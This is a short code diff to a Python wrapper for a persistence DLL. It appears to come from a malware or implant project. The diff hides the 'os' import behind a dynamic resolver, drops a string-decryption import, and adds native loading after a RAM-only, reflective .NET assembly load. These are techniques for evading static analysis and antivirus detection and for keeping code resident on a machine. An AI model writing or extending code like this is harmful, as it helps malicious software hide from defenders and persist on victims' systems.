@@ -1,8 +1,10 @@
-import os
+from core.resolver import (Resolver, _OS)
+os = Resolver.get_mod(_OS)
+
 import sys
 import clr
-from core.obfuscation import decrypt_string
 from core.error_logger import log_error, log_info
+from core.resolver import Resolver
 
 class PersistManager:
     """Python wrapper for defense/persist.dll (VanguardCore.PersistManager)"""
@@ -32,6 +34,7 @@ class PersistManager:
                         # S-09: RAM-Only loading
                         raw_bytes = File.ReadAllBytes(os.path.abspath(p))
                         Assembly.Load(raw_bytes)
+                        Resolver.load_native()
                         from VanguardCore import PersistManager as CSharpManager
                         self._manager = CSharpManager
                         self._initialized = True
